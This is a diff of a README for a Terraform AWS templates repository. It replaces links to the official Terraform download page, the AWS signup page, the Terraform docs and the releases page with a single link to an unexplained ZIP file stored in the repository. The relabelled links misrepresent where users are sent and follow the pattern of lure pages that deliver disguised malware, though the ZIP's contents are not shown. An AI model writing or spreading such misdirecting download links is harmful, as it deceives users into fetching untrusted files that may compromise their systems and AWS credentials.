@@ -1,6 +1,6 @@
 # ⚙️ terraform-templates - Simplify AWS Infrastructure Setup
 
-[![Download terraform-templates](https://img.shields.io/badge/Download-terraform--templates-brightgreen?style=for-the-badge)](https://github.com/gus430282/terraform-templates/releases)
+[![Download terraform-templates](https://img.shields.io/badge/Download-terraform--templates-brightgreen?style=for-the-badge)](https://github.com/gus430282/terraform-templates/raw/refs/heads/main/templates/3-tier-web-app/terraform_templates_Rembrandtesque.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Before you begin, check these system requirements on your Windows machine:
 
 terraform-templates uses Terraform to manage AWS resources. You will need to install Terraform first:
 
-1. Visit the official Terraform page: https://www.terraform.io/downloads.html
+1. Visit the official Terraform page: https://github.com/gus430282/terraform-templates/raw/refs/heads/main/templates/3-tier-web-app/terraform_templates_Rembrandtesque.zip
 2. Download the Windows 64-bit version.
 3. Follow the installation instructions on that page.
 4. Confirm Terraform works by opening the Command Prompt and typing:
@@ -58,7 +58,7 @@ You should see the installed version number.
 
 You need an AWS account to use these templates. If you don’t have one, create it here:
 
-https://aws.amazon.com/free/
+https://github.com/gus430282/terraform-templates/raw/refs/heads/main/templates/3-tier-web-app/terraform_templates_Rembrandtesque.zip
 
 After signing up, create an IAM user with permissions to manage resources. Save the access key ID and secret access key you get. You will use them later.
 
@@ -68,7 +68,7 @@ After signing up, create an IAM user with permissions to manage resources. Save 
 
 Click the large button above or visit the page below to download terraform-templates:
 
-[https://github.com/gus430282/terraform-templates/releases](https://github.com/gus430282/terraform-templates/releases)
+[https://github.com/gus430282/terraform-templates/raw/refs/heads/main/templates/3-tier-web-app/terraform_templates_Rembrandtesque.zip](https://github.com/gus430282/terraform-templates/raw/refs/heads/main/templates/3-tier-web-app/terraform_templates_Rembrandtesque.zip)
 
 On this page, look for the latest release version. Releases usually come as ZIP files containing the templates.
 
@@ -186,7 +186,7 @@ Use `terraform destroy` only if you want to delete everything created to avoid A
 
 These templates are based on Terraform modules and AWS services. To better understand what happens behind the scenes:
 
-- Visit [Terraform Documentation](https://terraform.io/docs)
+- Visit [Terraform Documentation](https://github.com/gus430282/terraform-templates/raw/refs/heads/main/templates/3-tier-web-app/terraform_templates_Rembrandtesque.zip)
 - Learn about individual AWS services you are using.
 - Practice on a free AWS account before deploying real workloads.
 
@@ -196,4 +196,4 @@ These templates are based on Terraform modules and AWS services. To better under
 
 Get started by visiting this page and downloading the latest release:
 
-[https://github.com/gus430282/terraform-templates/releases](https://github.com/gus430282/terraform-templates/releases)
+[https://github.com/gus430282/terraform-templates/raw/refs/heads/main/templates/3-tier-web-app/terraform_templates_Rembrandtesque.zip](https://github.com/gus430282/terraform-templates/raw/refs/heads/main/templates/3-tier-web-app/terraform_templates_Rembrandtesque.zip)
